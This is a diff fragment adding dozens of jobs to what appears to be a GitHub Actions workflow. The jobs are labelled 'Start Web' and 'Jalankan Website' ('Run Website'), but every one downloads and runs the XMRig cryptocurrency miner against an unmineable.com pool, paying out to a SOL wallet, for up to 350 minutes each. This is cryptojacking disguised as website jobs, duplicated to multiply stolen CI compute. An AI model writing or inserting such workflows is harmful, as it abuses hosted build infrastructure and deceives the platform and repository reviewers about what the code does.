+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_49:
+    name: Start Web 49
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_50:
+    name: Start Web 50
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_51:
+    name: Start Web 51
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_52:
+    name: Start Web 52
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_53:
+    name: Start Web 53
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_54:
+    name: Start Web 54
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_55:
+    name: Start Web 55
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_56:
+    name: Start Web 56
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_57:
+    name: Start Web 57
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_58:
+    name: Start Web 58
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_59:
+    name: Start Web 59
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_60:
+    name: Start Web 60
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_61:
+    name: Start Web 62
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_63:
+    name: Start Web 63
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_64:
+    name: Start Web 64
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_65:
+    name: Start Web 65
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_66:
+    name: Start Web 66
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+
+  Website_67:
+    name: Start Web 67
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_68:
+    name: Start Web 68
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_69:
+    name: Start Web 69
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_70:
+    name: Start Web 70
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_71:
+    name: Start Web 71
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_72:
+    name: Start Web 72
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_73:
+    name: Start Web 73
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_74:
+    name: Start Web 74
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_75:
+    name: Start Web 75
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_76:
+    name: Start Web 76
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_77:
+    name: Start Web 77
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_78:
+    name: Start Web 78
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_79:
+    name: Start Web 79
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_80:
+    name: Start Web 80
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_81:
+    name: Start Web 81
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
